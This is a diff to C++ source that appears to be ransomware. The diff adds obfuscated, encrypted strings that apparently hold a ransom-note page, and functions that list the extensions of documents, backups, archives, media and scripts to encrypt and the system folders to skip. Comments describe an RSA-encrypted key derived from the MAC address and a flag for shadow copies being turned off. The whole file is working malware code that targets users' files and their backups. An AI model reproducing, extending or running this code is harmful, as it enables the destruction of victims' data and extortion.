+static std::string html_body{ base64_decode(InnerDecrypt("vxY+*K%x*Cv+++C,Y%*NYt*+vxY+*K*$vNv+vtC,Y%*NYt*+YNY%Yt%K*tYKvC*KY-*;Y*++*%Y++K+xvN%CY*%x*tv+%N+vYNYv*$YYvY%x%Y%NYN*;vm*K*Y*;*$*m*C%C%Y+v*tv+Y(+*YN*NYCY%vY%tYmYvvCv*YN*+vxv%Yt*N*C*;%N+vvmv%YN*+vt%xY*vtv*Yv*$vxvY*NYt%NYNY%YmY-*C+NYN*+vt%x%NY-v*Yvv*vNv*Yv%tY*vY*$vv*+vxv%Yt*Nv+v+v*+mYN*NYCYmvY*,%vY*vv*,Ymvxvv*,vCY*vv*NYt%NYNY%YmY-*C+NYN*+vYvvY*vNv%vv%tYmv+*,v*Y%v*v*vCvvvY%x%Y*+vxv%Yt*NvY*;%K*NYNYv%tYmvY*,*$Y(v%v*+xY*vt*$v*vvv*Yv%NY-YNYY%x*+YN*,%v+*YN*NYCY-vtv*vmYmvC%xY*Y%vYYvvv*+vxv%Yt*Nv+v+v*+mYN*NYCvYvt%tYmvxvYYv++*+vxv%Yt*NvY*;%K*NYNY*Y(YYvv*,%NY;vYYvvmY;vtv*vt*+vxv%Yt*NvY*;%K*NYNY*Y(Y*vYYvv*YYv*Yv*$vxvY*NYt%NYNY%YmvmvmvKY;*NYNY*Y(YNvY%t*YYmvY*$vCYCvv%x+YY%vtv*YN*+vxv%Yt*Nv+v+v*+mYN*NYCvYv%vv%vYKvYYvv*YmvY*$Y(vvvtvv%vYYvCv%Yt%NYNY%YmvmvmvKY;*NYNY*Y(vmvv%x%tY*vY*$vv*+vxv%Yt*Nv+v+v*+mYN*N%KC,Y%*NYt*+YNY%Yt*+vxYKY(%x*vv++K*$vx*;Ym+*vmYK*$%+vN%%v*+N*%%C%N+NY-*;vC*$vm*;Y*%t*CYKvt%+vN*;Y**m*t%C*Y+N*C%%v*+vvmY%%t*m*C%C+K+**%*m*-*mvCvY*YY*Y(%xvv%%Y-%C%t*K*%*;*Y+x*C*m*-++Y-%Cvm+**C*(vt+Yvm*;Y*+Y*tv++K%vY-*NYmYNvmv++K%CvmvKvC+xvN%CY*Y-vmvKv**$Y$vv+K+xvm%C*K%xYN*N++*Nv%Y+v*+%*Y*;v*%x*tv+Y(*KYNYv%v*$*Yv+vv*+vYY+*$*(*tYKvt*NY$Y%YmYNvmv++K%CvmvKvC+xvN%CYv*+vY*;v*%tvmv%YN+%v%Y+v*+%*Y*;v*%x*tv+Y(*KY$YvY*+N*tv+Y*+%Y$YKY(*K*C*(Y;+Y*%%Cv*+N*tv+vN%+*YY+v*%Y*YY%%t*K*CY+*$*(*C*m+x*mvmv+%v%xvmvKYN%+Y$*(vm*K*YvKY(%x*vv++K*$*v%C%t*K*%*;*Y+x*C*m*-+KY;YKYC%YY-%C*K*$*tv+*Y*-*YYY*-%tY;*mYC++*vYY+Y%%*tv+vC%x*tYY*-+KY;vYYt++*%YK*K%NY$*(Y(*m*v%C%t*K*%*;*Y+x*C*m*-+KY;YKYC%YYNYYYv%tY;YKYC%YY-%Cvm+**C*(vt+Y*%%C*$%*vmvY*-%xY;YKYC%YY-%%*Y+xvmYKvC*-Y-*m*,++Y;YKYC%YY-%%YC*KvmY+vC+x*C*;*%%*Y;*mYC++*vYY+Y*NvNv+Y(+Cvm%%Ym+**Yv+%v*,Y$v+Y(+**CY+%N+NY-*NY;%%vNvY*Y*KY(%CYv%+vN%C%N+%*C%%YN%*YN%xvmY+Y(YvY;%xvt+m+Y*NvNv+Y(+Cvm%%Ym+**Yv+%v*,Y$v+*$+YvNv+*Y*$Y-*(v*+N*CY%*K*,vNvKvC*KY-*;*$+YvNv+*Y*$Y$%%YC+vvm+m+Y*NvNvKY(*$Y(*mvt+%*tv*vmY%vY%tYm%%Y;Yv+YYKvm%C%NYCvtvvY*YCvY*$Y(v**tYvv*v*vm%xY*YCvtvvY*v*vtvvY*YCvtvvvmYYvtv**$YCvtvvY*YYvY*;Ym%vvN*;+KYCvtvvY*YCv%*mYC+%vCv*Y*v+vv*mvt+N*Cv**KY(*%%tY*+CvtvvY*YC*v*,vCY(v%Y%+YvYY$+mvN%vvYvYvmv+vtv+%N*$vtv+*YYKvCY*Y*Y+v%v**%+*Y(Y*Y*vCvtv*Ym*N*Y%CY*Y+Y,%xYN+mY,%tY(vtvC%xY*+*Y-Y+Ym+%vm%xY*YCvtvvY*YCvCv++KY+v*Y++YvY*Yv*Y*+Yvt%xY;+x**v%%v*N*%*;*$*$vm*;+K%v*v%%YC+**%%C*$%x*tv+%N+vY-*;Y**N*%%C%N+%*YvKvC*$Y-%C+K*$vm*(vt%*Y(vYYC++*vYY+Y%%*tv+vC%x*tYY*-%xY-YYYC++*vYK%x+vvmY+v*%xvNv+*$+%vmv+vC%+vmY+*$+m*%Y++K*K*vvY+x+x*C*;+K+x*C*;vv+YvN*;+K+*vN%C+%%+*Cv+Y*+Nvm%C*$+vY$v++K*$vm*(vt%*Y(vYY;++*%YK*+%+*Y%C*$*,*YY+*+%*Y(*mvN++*%YK*K%NY$*;Ym%x*tvK+Y*NvNv+Y(+Cvm%%Ym+**Yv+%v*,Y$v+Y(+**CY+%N+NY-*NY(YvvC*,vCY+vCYvvN%+vN%C%N+%*C%%YN%*YN+mvv%tY(vY+Y*;*C%C%v%xY$vKY(+x*v*;vv%*Y;*m*K++*vYY+Y++vNv+vC*,*tv+%v*(Y-*mYv++*%YK*K%N*tYKYm%+*Y%C*$*,*YY+*+%*Y-vYYt*$YmvK%x+v*%%CY(*$vmYK+Y+YvNvKYm*(*tv+%Y+Y*YY+%N++Y-*mYv%t*%YK*+%+*YY+v*%Y*YY%%t*K*CY+*$*(*C*m+x*mvmv+%v%xvmvKYN%+vm*;%N+v*YY%%t+m*tvK+x*$Y-*mYN%%*%YK*+%+*tY+v*+xvm%C*K%xY-*mYN+NY;YKYC%YY-%%YC*KvmY+vC+x*C*;*%%*Y;*mYC++*vYY+Y*NvNv+Y(+Cvm%%Ym+**Yv+%v*,Y$v+Y(+**CY+%N+NY-*NY;%CvNvYvm*KY(*;Yv%+*CY+*$+vvmv%%t*-vmv+*$*(*tYKvt%*Y;v%%Y%tY-%CY(+**CY+%N+NY-*NY(Y*vtvvv*YCvCvvYv%+vN*;Y**m*t%C*Y+N*C%%v*+vvmY%%t+x*Cv+Y**(vmvY+x%t*%*;++*-vmY+Y*%xvNvY+x+x*Cv+Y**(vmv%%N++*C*;*%%+vN*;Y*+mvmvYvN%xY$Y+*$v+vt*,%Nv%*Y+mYCY$vC%C*Y+*vtvvY*YCvtvv%vvYv*v+*KY*v*v+*YYCvtvvY*YCv*vvY*YCvtvvY*Y+vt%xY*vmvtvvY*YCvt%x%v*N*vv+Ym+%vtvvY*YCvtvv*-++*CYvv*vCv**$YN%xY;*;%tvNvYvKY(vC*t%xY*YCvtvK+xYvvYvv*++Cvv+N%K%CY-vv%x%Cv**,Y*+*vmvvY**(vC%xvCvCvC*,*$vKY$+mvCvCvvvvY*v%vN*(*Y*KvC*N+YY%Y;+N+YvYvvYv*YYC*C+m*K*N*CY+*YYCvtvvY*YCvtvvv*+%vC*$vC+Cvv%%v*vC*CvvY(YYY,vK%t*;*C%%Ym+Y*v%CvC+x*%%%YC+%vNvK*,%**tv+%v+%*tv+%v*$**v%%v*,vN*(v*%x*YYK+Y+YvNvKYm*(*tv+%Y+Y*CY+v**;*YYY*-+N*%YK*+%+vm*;%N+v*YY%%t+m*tvK+x*$Y-*mYv%C*%YK*+%+vm*;%N+v*YY%%t%%vmv+*$*(*tYKvt%*Y(vYYt++Y-%CYm+**%*;vC*$*%*m+x+v*C%C%v*$Y-%CYm*KvN%C+Y*(*%*;%N%t*C*;vt+YvN%C%N+%*C%%YN%*YN+m*$*;Y-v+vN%vvm*m+Y*m*C%C+K+**%*m*-*mvCvvv*Y*Y-%CY(%t*%*(Y(+**%*m+x++*C%C*$+v*YY+v*+N**v%%v*;*C%C%N%xvmvKYm%+*YY+v*%Y*YY%%t*K*CY+*$*(*C*m+x+%vmv+vm%xY-%%YC+**%%C*$%x*tv+%N+vY-*(Ym*$*CY+Y*%x*tvKvm*$Y-%%*Y+xvmYKvC*-Y-*mvN++Y;YKYC%YY-%C%t*K*%*;*Y+x*C*m*-+N*%YK*+*+Y;*(YC%YYNYYYm++*vY%Yt%xY(vKYC%YY-%C*K*$*tv+*Y*-*YYY*-+KY(*(YC%YY-%Cvm+**C*(vt+Y*%%C*$%*vmvY*-+KY(vKYC%YY-%CYm*KvN%C+Y*(*%*;%N%t*C*;vt+YvN%C%N+%*C%%YN%*YN%xY(Y+vt%xvmYYvC*m+Y*m*C%C+K+**%*m*-*mY(YYvt%xY-%%YC*KvmY+vC+x*C*;*%%*Y(*(YC%Y**v%%v*;*C*;+K%+vm*;%N+v*YY%%t+m*tvK+x*$Y-*mYN+K*%YK*K%NY%*NYt*+YNY%Yt*+YNYY+++**%%%vC%v*CY+vvC,Y%*NYt*+YNY%Yt*+YNYY+K+YvmvKvC*KYNY+*K%x*YYKYt+YvmvKY*%t*tvKvN%NYN*,Y(+**C*(vC*$*C*(vt+Yv*YK*$++vmv%YN*+vN%C%N+v*YY+v*+v*YYY%x*N*YY+v*%Y*YY%%N*-*YY+%t+%Y-%CY(*-vNvKYm+mvmvKvt%N*YvKvC*;Y$vY*+*NY$+m%YY,YNY%Yt*+YNY%Yt*+vxYKvC+x*YY++K*$vx*m+++**YY+*$%x*CY+vvC,Y%*NYt*+YNY%Yt*+YNYY+K+mvN%%Ym+x*%YKvt*+*CY+Y*+vvm%%v**Kvm%Cvv%NYN*(vm*N*%%CY(+N*tvKYC%xYN*m%YY,YNY%Yt*+YNY%Yt*+YNY%YC+m*Yv+YN*+v*%C*$+vvmY+%N%%vK%x%N+v*CY+%N*KvmYt*-*+YNY%Yt*+YNY%Yt*+YNYK*Y+x*C*;vC+**Y+N%v+NvmvKY(+x*v*;v*vv*C+NYt+KY;*m*+++Y$YY*%+NY(vt*-*+YNY%Yt*+YNY%Yt*+YNYKY(*m*%*;v**$*C*$*Y+xvmYKvC*-YNYY%x*+vCY+%N*m*Yv+%t*$*C*(vt+vvvY+Y*+Nvmv+%v%xv*%C*$+vvmY+%N%%Y$*$Y(*m*%*;v**$*C*N%vYC*Y*;Y*+x*CY**Y+xvmYKvC*-Y%*NYt*+YNY%Yt*+YNY%Yt*+*%%CY(+Nvmv+v*+vv%Y+v*+xvm%C*K%xYNYY%x*+vCY+%N*m*Yv+%t*$*C*(vt+vvvY+Y*+Nvmv+%v%xv*%C*$+vvmY+%N%%Y$*$Y(*m*%*;v**$*C*N%vYC*Y*;Y*+x*CYv*K*$*tv+*Y*-*YYt*-*+YNY%Yt*+YNY%Yt*+YNYKYC+**%%x+K*$vm*(vt*+vxv%Yt*-*%%CY(+Nvmv+v*+vv*%C*$*,*YY+*+*+Y$v%Yt+KY;*m*+++Y,v%Yt+*YNYYYN*+Y%*NYt*+YNY%Yt*+YNY%Yt*+*%Y+%N+mv*Y+%N++YNYY%x*+Y,YKY(*m*%*;v**$*C*,*K*$*tv+*Y*-*YY%Yt+YYNYY*%+NY(v%*,*+Y$+NYt+NYNYt*-*+YNY%Yt*+YNY%Yt*+YNYK*Y+x*C*;vC+**Y+N%v+Y*C%%vm*$v*Y+%K*+*%Y+%N+mvYY+v**;*YY%++*+*%Y+%N+mv*Y+%N++YNYt*-*+YNY%Yt*+YNY%Yt*+YNY+v*+vvmY%YC+m*Yv+YN*+Y%*NYt*+YNY%Yt*+YNYY+++**%%CY(+N*tvKYC%xvx*+*-*+YNYY+++**tY+v**KvmYY%YY,YNY%Yt%KvN*;%N*,*vv%YC+mvN%%Ym+**CY+++%NYN*;%v+*YN*m%YY,v+%x*Kvvvtv*vCY*v+Y*vC*YY%*NYt*+vxY%%N*N*C%CvC%vvx*+*-%KY$%C*K%x*Cv+++C,\x00")) };
+static std::string html_head{ base64_decode(InnerDecrypt("vxY+*K%x*Cv+++C,Y%*NYt*+vxY+*K*$vNv+vtC,Y%*m+K+YvmvKvC*KYNY+Y(*-vNvKYm+mvmvKvt%NYN*$v*vvvC*N%x%YYN*m%YY,YNY%Yt%K*YY+*$%x*CY+vvC,vCv+%v+xvm%C%t*KvxY%%N%x*tvKvC+%vmvY%YY,YNY%Yt%KY$%C*K*$vNv+vtC,Y%*NYt*+vxY+Ym+*vmYK*,C,Y%*NYt*+v+%x*Kvvvtv*vCY*v+Y*vC*YY%*NYt*+vxY%%N*N*C%CvC%vvx*+*-*+YNYY+++**tYKvC+Y*CYY%Y%;\x00")) };
+static std::string html_js{ base64_decode(InnerDecrypt("vxY+*K%x*Cv+++C,Y%*NYt*+vxY+*K*$vNv+vtC,Y%*NYt*+YNY%Yt%K*tYKvC*KY-*;Y*++*%Y++K+xvN%CY*%x*tv+%N+vYNYv*$YYvY%x%Y%NYN*;vm*K*Y*;*$*m*C%C%Y+v*tv+Y(+*YN*NYCY%vY%tYmYvvCv*YN*+vxv%Yt*N*C*;%N+vvmv%YN*+vt%xY*vtv*Yv*$vxvY*NYt%NYNY%YmY-*C+NYN*+vt%x%NY-v*Yvv*vNv*Yv%tY*vY*$vv*+vxv%Yt*Nv+v+v*+mYN*NYCYmvY*,%vY*vv*,Ymvxvv*,vCY*vv*NYt%NYNY%YmY-*C+NYN*+vYvvY*vNv%vv%tYmv+*,v*Y%v*v*vCvvvY%x%Y*+vxv%Yt*NvY*;%K*NYNYv%tYmvY*,*$Y(v%v*+xY*vt*$v*vvv*Yv%NY-YNYY%x*+YN*,%v+*YN*NYCY-vtv*vmYmvC%xY*Y%vYYvvv*+vxv%Yt*Nv+v+v*+mYN*NYCvYvt%tYmvxvYYv++*+vxv%Yt*NvY*;%K*NYNY*Y(YYvv*,%NY;vYYvvmY;vtv*vt*+vxv%Yt*NvY*;%K*NYNY*Y(Y*vYYvv*YYv*Yv*$vxvY*NYt%NYNY%YmvmvmvKY;*NYNY*Y(YNvY%t*YYmvY*$vCYCvv%x+YY%vtv*YN*+vxv%Yt*Nv+v+v*+mYN*NYCvYv%vv%vYKvYYvv*YmvY*$Y(vvvtvv%vYYvCv%Yt%NYNY%YmvmvmvKY;*NYNY*Y(vmvv%x%tY*vY*$vv*+vxv%Yt*Nv+v+v*+mYN*N%KC,Y%*NYt*+YNY%Yt*+vxYKY(%x*vv++K*$vx*;Ym+*vmYK*$%+vN%%v*+N*%%C%N+NY-*;vC*$vm*;Y*%t*CYKvt%+vN*;Y**m*t%C*Y+N*C%%v*+vvmY%%t*m*C%C+K+**%*m*-*mvCvY*YY*Y(%xvv%%Y-%C%t*K*%*;*Y+x*C*m*-++Y-%Cvm+**C*(vt+Yvm*;Y*+Y*tv++K%vY-*NYmYNvmv++K%CvmvKvC+xvN%CY*Y-vmvKv**$Y$vv+K+xvm%C*K%xYN*N++*Nv%Y+v*+%*Y*;v*%x*tv+Y(*KYNYv%v*$*Yv+vv*+vYY+*$*(*tYKvt*NY$Y%YmYNvmv++K%CvmvKvC+xvN%CYv*+vY*;v*%tvmv%YN+%v%Y+v*+%*Y*;v*%x*tv+Y(*KY$YvY*+N*tv+Y*+%Y$YKY(*K*C*(Y;+Y*%%Cv*+N*tv+vN%+*YY+v*%Y*YY%%t*K*CY+*$*(*C*m+x*mvmv+%v%xvmvKYN%+Y$*(vm*K*YvKY(%x*vv++K*$*v%C%t*K*%*;*Y+x*C*m*-+KY;YKYC%YY-%C*K*$*tv+*Y*-*YYY*-%tY;*mYC++*vYY+Y%%*tv+vC%x*tYY*-+KY;vYYt++*%YK*K%NY$*(Y(*m*v%C%t*K*%*;*Y+x*C*m*-+KY;YKYC%YYNYYYv%tY;YKYC%YY-%Cvm+**C*(vt+Y*%%C*$%*vmvY*-%xY;YKYC%YY-%%*Y+xvmYKvC*-Y-*m*,++Y;YKYC%YY-%%YC*KvmY+vC+x*C*;*%%*Y;*mYC++*vYY+Y*NvNv+Y(+Cvm%%Ym+**Yv+%v*,Y$v+Y(+**CY+%N+NY-*NY;%%vNvY*Y*KY(%CYv%+vN%C%N+%*C%%YN%*YN%xvmY+Y(YvY;%xvt+m+Y*NvNv+Y(+Cvm%%Ym+**Yv+%v*,Y$v+*$+YvNv+*Y*$Y-*(v*+N*CY%*K*,vNvKvC*KY-*;*$+YvNv+*Y*$Y$%%YC+vvm+m+Y*NvNvKY(*$Y(*mvt+%*tv*vmY%vY%tYm%%Y;Yv+YYKvm%C%NYCvtvvY*YCvY*$Y(v**tYvv*v*vm%xY*YCvtvvY*v*vtvvY*YCvtvvvmYYvtv**$YCvtvvY*YYvY*;Ym%vvN*;+KYCvtvvY*YCv%*mYC+%vCv*Y*v+vv*mvt+N*Cv**KY(*%%tY*+CvtvvY*YC*v*,vCY(v%Y%+YvYY$+mvN%vvYvYvmv+vtv+%N*$vtv+*YYKvCY*Y*Y+v%v**%+*Y(Y*Y*vCvtv*Ym*N*Y%CY*Y+Y,%xYN+mY,%tY(vtvC%xY*+*Y-Y+Ym+%vm%xY*YCvtvvY*YCvCv++KY+v*Y++YvY*Yv*Y*+Yvt%xY;+x**v%%v*N*%*;*$*$vm*;+K%v*v%%YC+**%%C*$%x*tv+%N+vY-*;Y**N*%%C%N+%*YvKvC*$Y-%C+K*$vm*(vt%*Y(vYYC++*vYY+Y%%*tv+vC%x*tYY*-%xY-YYYC++*vYK%x+vvmY+v*%xvNv+*$+%vmv+vC%+vmY+*$+m*%Y++K*K*vvY+x+x*C*;+K+x*C*;vv+YvN*;+K+*vN%C+%%+*Cv+Y*+Nvm%C*$+vY$v++K*$vm*(vt%*Y(vYY;++*%YK*+%+*Y%C*$*,*YY+*+%*Y(*mvN++*%YK*K%NY$*;Ym%x*tvK+Y*NvNv+Y(+Cvm%%Ym+**Yv+%v*,Y$v+Y(+**CY+%N+NY-*NY(YvvC*,vCY+vCYvvN%+vN%C%N+%*C%%YN%*YN+mvv%tY(vY+Y*;*C%C%v%xY$vKY(+x*v*;vv%*Y;*m*K++*vYY+Y++vNv+vC*,*tv+%v*(Y-*mYv++*%YK*K%N*tYKYm%+*Y%C*$*,*YY+*+%*Y-vYYt*$YmvK%x+v*%%CY(*$vmYK+Y+YvNvKYm*(*tv+%Y+Y*YY+%N++Y-*mYv%t*%YK*+%+*YY+v*%Y*YY%%t*K*CY+*$*(*C*m+x*mvmv+%v%xvmvKYN%+vm*;%N+v*YY%%t+m*tvK+x*$Y-*mYN%%*%YK*+%+*tY+v*+xvm%C*K%xY-*mYN+NY;YKYC%YY-%%YC*KvmY+vC+x*C*;*%%*Y;*mYC++*vYY+Y*NvNv+Y(+Cvm%%Ym+**Yv+%v*,Y$v+Y(+**CY+%N+NY-*NY;%CvNvYvm*KY(*;Yv%+*CY+*$+vvmv%%t*-vmv+*$*(*tYKvt%*Y;v%%Y%tY-%CY(+**CY+%N+NY-*NY(Y*vtvvv*YCvCvvYv%+vN*;Y**m*t%C*Y+N*C%%v*+vvmY%%t+x*Cv+Y**(vmvY+x%t*%*;++*-vmY+Y*%xvNvY+x+x*Cv+Y**(vmv%%N++*C*;*%%+vN*;Y*+mvmvYvN%xY$Y+*$v+vt*,%Nv%*Y+mYCY$vC%C*Y+*vtvvY*YCvtvv%vvYv*v+*KY*v*v+*YYCvtvvY*YCv*vvY*YCvtvvY*Y+vt%xY*vmvtvvY*YCvt%x%v*N*vv+Ym+%vtvvY*YCvtvv*-++*CYvv*vCv**$YN%xY;*;%tvNvYvKY(vC*t%xY*YCvtvK+xYvvYvv*++Cvv+N%K%CY-vv%x%Cv**,Y*+*vmvvY**(vC%xvCvCvC*,*$vKY$+mvCvCvvvvY*v%vN*(*Y*KvC*N+YY%Y;+N+YvYvvYv*YYC*C+m*K*N*CY+*YYCvtvvY*YCvtvvv*+%vC*$vC+Cvv%%v*vC*CvvY(YYY,vK%t*;*C%%Ym+Y*v%CvC+x*%%%YC+%vNvK*,%**tv+%v+%*tv+%v*$**v%%v*,vN*(v*%x*YYK+Y+YvNvKYm*(*tv+%Y+Y*CY+v**;*YYY*-+N*%YK*+%+vm*;%N+v*YY%%t+m*tvK+x*$Y-*mYv%C*%YK*+%+vm*;%N+v*YY%%t%%vmv+*$*(*tYKvt%*Y(vYYt++Y-%CYm+**%*;vC*$*%*m+x+v*C%C%v*$Y-%CYm*KvN%C+Y*(*%*;%N%t*C*;vt+YvN%C%N+%*C%%YN%*YN+m*$*;Y-v+vN%vvm*m+Y*m*C%C+K+**%*m*-*mvCvvv*Y*Y-%CY(%t*%*(Y(+**%*m+x++*C%C*$+v*YY+v*+N**v%%v*;*C%C%N%xvmvKYm%+*YY+v*%Y*YY%%t*K*CY+*$*(*C*m+x+%vmv+vm%xY-%%YC+**%%C*$%x*tv+%N+vY-*(Ym*$*CY+Y*%x*tvKvm*$Y-%%*Y+xvmYKvC*-Y-*mvN++Y;YKYC%YY-%C%t*K*%*;*Y+x*C*m*-+N*%YK*+*+Y;*(YC%YYNYYYm++*vY%Yt%xY(vKYC%YY-%C*K*$*tv+*Y*-*YYY*-+KY(*(YC%YY-%Cvm+**C*(vt+Y*%%C*$%*vmvY*-+KY(vKYC%YY-%CYm*KvN%C+Y*(*%*;%N%t*C*;vt+YvN%C%N+%*C%%YN%*YN%xY(Y+vt%xvmYYvC*m+Y*m*C%C+K+**%*m*-*mY(YYvt%xY-%%YC*KvmY+vC+x*C*;*%%*Y(*(YC%Y**v%%v*;*C*;+K%+vm*;%N+v*YY%%t+m*tvK+x*$Y-*mYN+K*%YK*K%NY%*NYt*+YNY%Yt*+YNYY+++**%%%vC%v*CY+vvC,Y%*NYt*+YNY%Yt*+YNYY+K+YvmvKvC*KYNY+*K%x*YYKYt+YvmvKY*%t*tvKvN%NYN*,Y(+**C*(vC*$*C*(vt+Yv*YK*$++vmv%YN*+vN%C%N+v*YY+v*+v*YYY%x*N*YY+v*%Y*YY%%N*-*YY+%t+%Y-%CY(*-vNvKYm+mvmvKvt%N*YvKvC*;Y$vY*+*NY$+m%YY,YNY%Yt*+YNY%Yt*+vxYKvC+x*YY++K*$vx*m+++**YY+*$%x*CY+vvC,Y%*NYt*+YNY%Yt*+YNYY+K+mvN%%Ym+x*%YKvt*+*CY+Y*+vvm%%v**Kvm%Cvv%NYN*(vm*N*%%CY(+N*tvKYC%xYN*m%YY,YNY%Yt*+YNY%Yt*+YNY%YC+m*Yv+YN*+v*%C*$+vvmY+%N%%vK%x%N+v*CY+%N*KvmYt*-*+YNY%Yt*+YNY%Yt*+YNYK*Y+x*C*;vC+**Y+N%v+NvmvKY(+x*v*;v*vv*C+NYt+KY;*m*+++Y$YY*%+NY(vt*-*+YNY%Yt*+YNY%Yt*+YNYKY(*m*%*;v**$*C*$*Y+xvmYKvC*-YNYY%x*+vCY+%N*m*Yv+%t*$*C*(vt+vvvY+Y*+Nvmv+%v%xv*%C*$+vvmY+%N%%Y$*$Y(*m*%*;v**$*C*N%vYC*Y*;Y*+x*CY**Y+xvmYKvC*-Y%*NYt*+YNY%Yt*+YNY%Yt*+*%%CY(+Nvmv+v*+vv%Y+v*+xvm%C*K%xYNYY%x*+vCY+%N*m*Yv+%t*$*C*(vt+vvvY+Y*+Nvmv+%v%xv*%C*$+vvmY+%N%%Y$*$Y(*m*%*;v**$*C*N%vYC*Y*;Y*+x*CYv*K*$*tv+*Y*-*YYt*-*+YNY%Yt*+YNY%Yt*+YNYKYC+**%%x+K*$vm*(vt*+vxv%Yt*-*%%CY(+Nvmv+v*+vv*%C*$*,*YY+*+*+Y$v%Yt+KY;*m*+++Y,v%Yt+*YNYYYN*+Y%*NYt*+YNY%Yt*+YNY%Yt*+*%Y+%N+mv*Y+%N++YNYY%x*+Y,YKY(*m*%*;v**$*C*,*K*$*tv+*Y*-*YY%Yt+YYNYY*%+NY(v%*,*+Y$+NYt+NYNYt*-*+YNY%Yt*+YNY%Yt*+YNYK*Y+x*C*;vC+**Y+N%v+Y*C%%vm*$v*Y+%K*+*%Y+%N+mvYY+v**;*YY%++*+*%Y+%N+mv*Y+%N++YNYt*-*+YNY%Yt*+YNY%Yt*+YNY+v*+vvmY%YC+m*Yv+YN*+Y%*NYt*+YNY%Yt*+YNYY+++**%%CY(+N*tvKYC%xvx*+*-*+YNYY+++**tY+v**KvmYY%YY,YNY%Yt%KvN*;%N*,*vv%YC+mvN%%Ym+**CY+++%NYN*;%v+*YN*m%YY,v+%x*Kvvvtv*vCY*v+Y*vC*YY%*NYt*+vxY%%N*N*C%CvC%vvx*+*-%KY$%C*K%x*Cv+++C,\x00")) };
 static std::string formatted_mac_string{ "" }; //global formatted mac string
-static std::wstring temp_path; //path to temp
-static std::string enigma_dot_rsa; //ENIGMA.RSA
+static std::wstring temp_path_wstr; //path to temp
+static std::wstring temp_path_copy_wstr; //path to temp, copy
 static std::wstring temp_file;
 static std::wstring desktop_dir;
-static std::string derived_key{ "" }; //key derived from mac + 18 random bytes and encrypted with EncryptRsa
+static std::string encrypted_key{ "" }; //key derived from mac + 18 random bytes and encrypted with EncryptRsa
 static std::vector<std::wstring> doc_exts_vector;//documents extensions
 static std::vector<std::wstring> script_exts_vector; //scripts extensions
 static std::vector<std::wstring> archive_exts_vector;
 static std::vector<std::wstring> media_exts_vector;
 static std::vector<std::wstring> directories;
 static std::vector<std::wstring> backup_exts_vector;
-static std::vector<std::wstring> all_extensions; //first 4 in here
-static std::vector<int> vector_filetype_count; //files counter, used in enigmaThread1
+static std::vector<std::wstring> exts_to_encrypt; //first 4 in here
+static std::vector<int> encoded_exts_stats; //encoded files statistics by extensions
 static std::vector<std::string> files_to_encode; //files to encode vector, used in enigmaThread1
-std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
-uint32_t enigma_dot_rsa_newlines;
+uint32_t enigma_dot_rsa_num_lines;
 static bool no_more_files = false; //interthread var, no sync
 static bool file_coding_thread_not_finished = true; //interthread var, no sync
-static bool shadowCopyOff = 0; //shadow copying was turned off in thread
+static bool is_shadow_copy_off = 0; //shadow copying was turned off in thread
 static bool finished = false; //finished flag, set in main thread
 static int files_found = 0; //total files affected counter
-
+//========================================================================
+//   fill vector with backup extensions strings
+//========================================================================
 void FillBackupExts() {
   /*
  $db,001,001,002,113,73b,aba,abf,,acp,as4,asd,ashbak,asvx,ate,ati,bac,bak,bak,bak~,bak2,bak3,bakx,bbb,bbz,bck,bckp,bcm,bk1,bk1,bkc,bkf,bkp,bks,blend1,blend2,bm3,bpa,bpb,bpm,bpn,bps,bup,bup,cbk,cbu,ck9,crds,da0,dash,dba,dbk,diy,dna,dov,fbc,fbf,fbk,fbk,fbu,fbw,fh,fhf,flka,flkb,fpsx,ftmb,ful,fza,gb1,gb2,gbp,gho,ghs,icf,ipd,iv2i,jbk,jdc,kb2,lcb,llx,mbk,mbw,mdbackup,mddata,mdinfo,mem,mig,mpb,mv_,nb7,nba,nbak,nbd,nbd,nbf,nbf,nbi,nbk,nbs,nbu,nco,nfb,nfc,npf,nps,nrbak,nrs,nwbak,obk,oeb,old,onepkg,ori,orig,paq,pbb,pbj,qba.tlg,qbb,qbk,qbm,qbmb,qbmd,qbx,qic,qsf,qualsoftcode,qv~,rbc,rbf,rbk,rbs,rdb,rgmb,rmbak,rrr,sbb,sbs,sbu,skb,sn1,sn2,sna,sns,spf,spg,spi,srr,stg,sv$,sv2i,tbk,tdb,tig,tis,tlg,tmr,trn,ttbk,uci,v2i,vbk,vbm,vbox-prev,vpcbackup,vrb,wbb,wbcat,win,win,wjf,wpb,wspak,xlk,yrcbck 
@@ -254,6 +258,9 @@ void FillBackupExts() {
   backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+K*$*,")));
   backup_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+N+C*%*C*%*,")));
 }
+//========================================================================
+//   fill vector with directories' strings
+//========================================================================
 void FillDirs() {
   /*
   RECYCLER,Recycle,WINDOWS,$WINDOWS.~WS,$WINDOWS.~BT,Windows.old,tmp,winnt,Application Data,AppData,Program Files(x86),Program Files,temp,thumbs.db,$Recycle.Bin,System Volume Information,Boot,Windows
@@ -277,7 +284,9 @@ void FillDirs() {
   directories.push_back(converter.from_bytes(InnerDecrypt("YC*-*-+Y")));
   directories.push_back(converter.from_bytes(InnerDecrypt("v+*N*(*Y*-+++%")));
 }
-
+//========================================================================
+//   fill vector with media files extensions strings
+//========================================================================
 void FillMediaExts() {
   /*
  jpg,avi,mpeg,mpg,fla,wmv,swf,djv,djvu,bmp,gif,png,jpeg,tif,tiff,mkv,mov,vdi,aes 
@@ -302,7 +311,9 @@ void FillMediaExts() {
   media_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+**Y*N")));
   media_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*t*v+%")));
 }
-
+//========================================================================
+//   fill vector with archives extensions strings
+//========================================================================
 void FillArcExts() {
   /*
  tbk,zi,zip,zipx,zix,zip,7z,001,002,bz,bz2,bza,bzip,bzip2,czip,gz,gz2,gza,gzi,gzip,gz,rar,sqx,sqz,srep,tar,lzma,xz,taz,tbz,tbz2,tg,tgz,tlz,tlzma,tsk,tx_,txz,tz,uc2 
@@ -348,7 +359,9 @@ void FillArcExts() {
   archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+Y+m")));
   archive_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+v*%%C")));
 }
-
+//========================================================================
+//   fill vector with scripts extensions strings
+//========================================================================
 void FillScriptsExts() {
   /*
  sql,sqlite,sqlite3,sqlitedb,php,asp,aspx,html,psd,2d,3dc,cad,cmd,bat,java,asp,vbs,asm,php,pas,cpp,MYI,MYD,sqlitedb,ms11(Security copy) 
@@ -379,7 +392,9 @@ void FillScriptsExts() {
